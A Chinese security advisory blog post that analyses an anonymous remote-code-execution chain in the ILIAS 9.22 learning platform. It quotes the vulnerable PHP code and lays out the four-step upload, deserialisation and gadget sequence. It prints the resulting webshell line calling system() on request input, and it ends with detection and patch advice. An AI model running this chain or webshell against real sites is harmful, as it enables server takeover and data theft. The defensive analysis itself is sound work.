#  【漏洞预警】ILIAS 9.22 零权限 RCE： 无需任何账号，四步写入 webshell  
原创 YNsec
                        YNsec  YNsec安全实验室   2026-10-21 12:32  
  
漏洞预警  
# ILIAS 9.22 零权限 RCE：无需任何账号，四步写入 webshell  
  
漏洞预警 · 组合利用链拆解 · 靶场实测  
  
摘要  
两个单独都不致命的缺陷，因为「坐标重合」被串成了一条完整 RCE：一个漏掉权限校验的上传，写进了一个会被反序列化的临时文件，再借 guzzle 的析构函数写到站点根目录。全程零凭据。  
  
**说明：**  
本文所有验证均在授权靶场完成，目标地址与敏感路径已脱敏（IP 使用 RFC5737 文档专用地址段）。文中不提供可直接使用的完整利用代码，仅呈现原理与请求形态，供防御方研判与加固。请勿对未授权系统进行测试。  
## 一、漏洞概述  
<table><thead><tr><th style="background: rgb(253, 243, 241);border: 1px solid rgb(232, 213, 208);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(122, 43, 28);"><section><span leaf="">项目</span></section></th><th style="background: rgb(253, 243, 241);border: 1px solid rgb(232, 213, 208);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(122, 43, 28);"><section><span leaf="">结论</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">受影响产品</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><section><span leaf="">ILIAS（开源学习管理系统）9.22</span></section></td></tr><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">漏洞类型</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><section><span leaf="">零权限（未授权）远程代码执行</span></section></td></tr><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">涉及编号</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><section><span leaf="">VE-0282（未授权任意文件写入）+ VE-0301（无限制反序列化）</span></section></td></tr><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">攻击者起点</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><section><span leaf="">无任何账号 / Cookie / Token / Session，全程匿名</span></section></td></tr><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">执行权限</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 5px;font-family: Consolas, monospace;font-size: 12.5px;"><span leaf="">uid=994(nginx)</span></code><section><span leaf="">，即 PHP-FPM 工作进程用户</span></section></td></tr><tr><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;font-weight: 600;"><section><span leaf="">利用前提</span></section></td><td style="border: 1px solid rgb(232, 213, 208);padding: 9px 10px;"><section><span leaf="">站点存在一个</span><strong><span leaf="">匿名可读</span></strong><span leaf="">的 SCORM 2004 学习模块</span></section></td></tr></tbody></table>  
一句话总结：匿名攻击者先把承载 PHP 载荷的序列化 gadget 投毒进 SCORM 的日志临时文件，再触发**无限制反序列化**  
，借 gadget 的析构函数把 webshell 写到站点根目录——全程不需要任何凭据。  
  
🚨 **危害面为什么大：**  
执行身份是 PHP-FPM 进程用户，对站点代码、配置文件、会话数据、数据库凭据基本都有读权限。**一次匿名请求，等于交出了整站。**  
## 二、影响范围与自查条件  
  
本次实测基于 ILIAS 9.22（nginx 1.24 + PHP-FPM 8.1.34 + MariaDB 10.5.29）。是否受影响，可以按下面四条件逐条对照：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">自查条件</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">站点启用了 SCORM / SCORM 2004 模块</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">这是整条链的入口，且是最常见的教学配置</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">存在允许</span><strong><span leaf="">匿名访问</span></strong><span leaf="">的课程 / 学习模块</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">公开课程、招生页试听模块都属于此列</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">未合入权限校验补丁</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">见第八节修复项 1，这是根治点</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">PHP-FPM 进程对站点根目录可写</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">这一条会把「写入」直接放大成「执行」</span></section></td></tr></tbody></table>  
💡 **一条能直接用的排查线索：**  
这条链写出来的 webshell，文件开头必然是 [{"Name":  
 —— 因为落盘内容本质上是 FileCookieJar::save()  
 生成的 JSON。**在站点根目录搜「内容以 [{"Name": 开头的 .php 文件」**  
，是一个非常独特且低误报的指纹。  
## 三、第一个洞：少了一行 checkAccess  
  
在 ilObjSAHSLearningModuleGUI::executeCommand()  
 里，处理文件系统界面的那个分支是这样的：  
  
Modules/ScormAicc/classes/class.ilObjSAHSLearningModuleGUI.php:119  
  
  
case "ilfilesystemgui":  
    $fs_gui = new ilFileSystemGUI($this->object->getDataDirectory());  
    $fs_gui->setUseUploadDirectory(true);  
    $fs_gui->setTableId("sahsfs" . $this->object->getId());  
    $this->ctrl->forwardCommand($fs_gui);   // <-- 缺少 checkAccess('write') !!  
    break;  
  
  
而**同一个文件**  
里，紧邻的另一个分支是这么写的：  
  
同文件 L101 · 有校验  
  
  
case "ilobjectmetadatagui":  
    ...  
    $ilAccess->checkAccess('write', '', $this->object->getRefId());   // 有  
  
  
一行之差。而且往下追，ilFileSystemGUI::uploadFile()  
 自身也不做权限校验，isValidSuffix()  
 在「未配置允许后缀」时对**任意后缀返回 true**  
：  
  
Services/FileSystem/classes/class.ilFileSystemGUI.php  
  
  
// getAllowedSuffixes() 为空时 —— SCORM 模块通常不配置后缀  
// isValidSuffix() 对任意扩展名一律返回 true  
// 结果：.php 也能传  
  
  
到这里看起来已经能拿 shell 了。但**这条链真正的难点，恰恰在于它做不到**  
。  
  
⚠️ **两个硬限制，把它按死在一个「无害」的格子里：**  
  
① 文件名经过 secure(stripSlashes())  
 清洗，路径穿越打不出去 —— 三种穿越写法实测全部失败，落点被钉死在 <webroot>/data/ilias/lm_data/lm_<objId>/  
。  
  
② 这个目录在 /data  
 下，由 WebAccessChecker（wac.php  
）守着，**即便落的是 .php 也不会被 PHP-FPM 执行**  
。  
  
所以单看这个洞，最坏的结果是「往一个不能执行的目录里塞了个文件」。**它自己是构不成 RCE 的。**  
  
那它为什么还是危险？因为第二个洞的坐标，正好和它重合。  
## 四、第二个洞：一个不该被反序列化的临时文件  
  
SCORM 播放器有个记录日志的方法 postLogEntry()  
，会把前端提交的日志写进临时文件：  
  
Modules/Scorm2004/classes/class.ilSCORM13PlayerGUI.php:1751  
  
  
$logdata  = json_decode(file_get_contents('php://input'));  
$filename = $this->logFileName();                 // 生成/校验守卫文件  
$tmp_name = $this->logTmpName();                  // = <datadir>/logs/<packageId>.tmp  
$fh_tmp   = fopen($tmp_name, 'r');  
if (filesize($tmp_name) > 0) {  
    $tmp_content = unserialize(fread($fh_tmp, filesize($tmp_name)));  
    //            ^^^^^^^^^^^ 没有 allowed_classes  
}  
  
  
三个「巧合」叠在一起，这件事就成立了：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">巧合</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">含义</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">目录重合</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">logDirectory()</span></code><section><span leaf=""> 指向的 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">/logs</span></code><span leaf="">，正是第一个洞能写进去的目录</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">文件名可控</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">logTmpName()</span></code><section><span leaf=""> 就是 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">&lt;packageId&gt;.tmp</span></code><span leaf="">，可以精确指定要覆盖哪个文件</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">先删后读</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">logFileName()</span></code><section><span leaf=""> 在守卫文件不存在时会 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">unlink()</span></code><span leaf=""> 掉这个 tmp</span></section></td></tr></tbody></table>  
第三条读起来有点绕，但它解释了整条链里最「反直觉」的一步：**你必须先造一个守卫文件。**  
  
为什么要先造守卫文件  
  
  
logFileName() 的逻辑：  
    logs/<objId>_<attempt>.html 不存在  
        → unlink(logTmpName())        ← 你刚投毒的 .tmp 被删了  
        → 反序列化拿到空内容，链路断在这里  
所以攻击顺序必须是：  
    ① 先请求一次 postLogEntry，让它正常生成 <objId>_<n>.html / .csv  
    ② 再投毒 .tmp  
    ③ 再触发一次 postLogEntry，此时守卫文件已存在 → 不再 unlink  
  
  
💡 这个「守卫文件」机制，是整条链最有意思的地方。unlink()  
 原本是为了清理垃圾，客观上却成了一道**隐式的时序闸门**  
——攻击者必须先配合这套逻辑走完第一步，才能进到第二步。绕不过去，只能顺着来。  
## 五、gadget：为什么是 FileCookieJar  
  
光有「能反序列化」还不够，得有一个**会被自动调用、且能写文件**  
的类。ILIAS 自带的 Composer 依赖里就有现成的：  
  
libs/composer/vendor/guzzlehttp/guzzle · FileCookieJar.php  
  
  
public function __destruct() {  
    $this->save($this->filename);          // filename 完全由攻击者控制  
}  
public function save(string $filename): void {  
    foreach ($this as $cookie) {  
        if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {  
            $json[] = $cookie->toArray();  
        }  
    }  
    $jsonStr = Utils::jsonEncode($json);  
    file_put_contents($filename, $jsonStr, \LOCK_EX);   // <-- Sink  
}  
  
  
三个要点：  
1. __destruct()  
 是**请求结束自动触发**  
的，不需要攻击者再做什么；  
  
1. $filename  
 是私有属性，序列化时用 \0类名\0属性名  
 的前缀就能指定，可以是**任意绝对路径**  
；  
  
1. 落盘内容是 JSON，但 PHP 解析这个文件时，**JSON 前缀只是普通文本，后面的 <?php ?> 照样执行**  
。  
  
所以只要把 PHP 代码塞进 SetCookie->data['Value']  
，写出来的文件就是一个「长得像 JSON 的 webshell」：  
  
落盘文件的真实内容（服务端取证）  
  
  
[{"Name":"x","Value":"<?php echo 'VE0282_<marker>'; system($_REQUEST[0]);?>  
","Domain":"a","Path":"\/","Max-Age":0,"Expires":9999999999,...}]  
  
  
注意最前面那个 [{"Name":  
 —— 它不会被 PHP 当语法错误，只会被当成普通文本输出。这也正是第二节那个排查指纹的由来。  
## 六、完整链路  
  
四步利用链（全程匿名）  
  
  
[匿名攻击者 · 零凭据]  
     │  
     ├─ ① 访问 SCORM 播放器（cmd=default）  
     │    → ILIAS 为匿名用户写入 sahs_user 跟踪行  
     │    → 缺这条记录，后面会 Whoops 跳 error.php  
     │  
     ├─ ② postLogEntry [#1]()  
  
     │    → 生成守卫文件 logs/<objId>_<n>.html / .csv  
     │  
     ├─ ③ VE-0282 未授权上传  
     │    → new_file → logs/<packageId>.tmp  
     │    → 内容是序列化的 FileCookieJar gadget（678 字节）  
     │  
     ├─ ④ postLogEntry [#2]()  
  
     │    → unserialize(logs/<packageId>.tmp)      ← VE-0301  
     │    → 请求结束，对象析构  
     │    → FileCookieJar::__destruct() → save()  
     │    → file_put_contents(任意绝对路径)        ← 写进 webroot  
     │  
     └─ ⑤ GET /ve0282_<marker>.php?0=id  
          → uid=994(nginx) gid=991(nginx)        ← RCE  
  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">步骤</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">动作</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">权限</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">0</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">匿名访问播放器，建立跟踪行</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">匿名（框架副作用）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">1</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">生成守卫文件</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">匿名 + 模块 read</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">2</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">未授权上传，投毒 .tmp</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><strong><span leaf="">完全无鉴权</span></strong></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">3</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">触发反序列化 → 任意路径写入</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">匿名</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><section><span leaf="">4</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">访问 webshell</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><strong><span leaf="">代码执行（nginx）</span></strong></td></tr></tbody></table>## 七、验证：怎么排除「假阳性」  
  
这类盲写链最容易出的问题是「其实没打通，只是看到了缓存或别人的文件」。验证时做了五件事：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">检查项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">做法</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">唯一随机标记</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">uuid4 前 8 位，同时用于文件名与回显串</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">多次独立复跑</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">3 次独立执行，3/3 命中各自 marker</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">字节级取证</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">服务端 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">cat</span></code><span leaf=""> 落盘文件，与 gadget 设计逐字节吻合</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">空手复跑</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">构造 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">NoCookiePolicy</span></code><span leaf="">，每个请求都不带也不回传 Cookie</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">起点独立性</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">每次运行都新建空 Session</span></section></td></tr></tbody></table>  
💡 其中「**逐请求丢弃 Cookie**  
」这一步特别关键。很多所谓的「零权限链」，其实偷偷用上了匿名会话下发的那一个 JSESSIONID——看起来没登录，实际上有状态。把 Cookie 从头到尾都扔掉还能跑通，才算真的空手。  
## 八、修复建议  
  
最高优先级（根治两个洞）  
1. **补上权限校验（VE-0282）**  
：在 executeCommand()  
 的 case "ilfilesystemgui"  
 分支里补上写权限判断，并在 ilFileSystemGUI::uploadFile()  
 内做统一鉴权；  
  
1. **收紧反序列化（VE-0301）**  
：unserialize()  
 加 ['allowed_classes' => false]  
，或干脆把日志改成 JSON 存储。对日志、dist* 这类"用户可影响"的内容，一律不反序列化对象；  
  
1. **消除可用 gadget**  
：升级 guzzle（新版本 FileCookieJar 行为已收敛），或对反序列化入口做类白名单，阻断 FileCookieJar  
 / SetCookie  
 这类"能写文件"的类。  
  
修复示意（权限校验）  
  
  
case "ilfilesystemgui":  
    if (!$ilAccess->checkAccess('write', '', $this->object->getRefId())) {  
        $ilErr->raiseError($lng->txt('permission_denied'), $ilErr->MESSAGE);  
    }  
    $fs_gui = new ilFileSystemGUI($this->object->getDataDirectory());  
    ...  
  
  
纵深防御（降低"写入即 RCE"的杀伤面）  
1. **收敛可写落点**  
：对 SCORM 数据目录做后缀白名单，不接受任意扩展名；  
  
1. **可写目录必须不可执行**  
：/data  
 已有 WAC 保护，要确保**任何用户能影响到的写入目录**  
都同样不可被 Web 执行；  
  
1. **降低运行权限**  
：PHP-FPM 进程不要以"对站点根目录有写权限"的用户运行。这一条不修漏洞，但它决定了漏洞的后果是一个站还是一个 shell；  
  
1. **盘点匿名可读的 SCORM 模块**  
：如果业务不需要匿名访问，把公开范围收掉，入口就没了。  
  
## 九、写在最后  
  
这条链最值得记住的，不是那 678 字节的 gadget，而是三点：  
1. **「单独不可利用」是会变的。**  
 文件写入被 WAC 挡住了、路径穿越被打死了——单独看它就是个中危。可一旦另一个洞的写入点正好落在它的目录上，两个"不致命"就凑成了一个"致命"。  
  
1. **反序列化永远是个放大器。**  
 它本身可能只值一个"对象注入"，但只要项目里装了任何带写文件、发请求、删目录的析构类，它就立刻变成 RCE。allowed_classes => false  
 这一行，成本几乎为零，收益极大。  
  
1. **「不可执行」往往是最后一道墙。**  
 这条链里，WAC 保护让第一个洞变成了哑弹；而 PHP-FPM 的写权限又让第三个洞变得致命。**同一套代码，配置不同，结局可能完全相反。**  
  
所以防守的优先级也很清楚：**先补那一行 checkAccess，再给 unserialize 加白名单，最后确认可写目录跑不了 PHP。**  
 三步做完，这条链就彻底断了。  
  
**📌 编号说明：**  
本文使用内部漏洞编号 VE-0282 / VE-0301 指代，未引用 CVE 编号。文中版本信息基于 9.22 的实测结果，其它版本请以第八节自查条件逐条比对，不要假设「不是 9.22 就安全」。  
  
如果这条预警对你有用  
  
点个「在看」转给管 LMS 的同事 👇  
尤其是那些为了做公开课，把 SCORM 模块开成匿名可读的站点。  
  
  
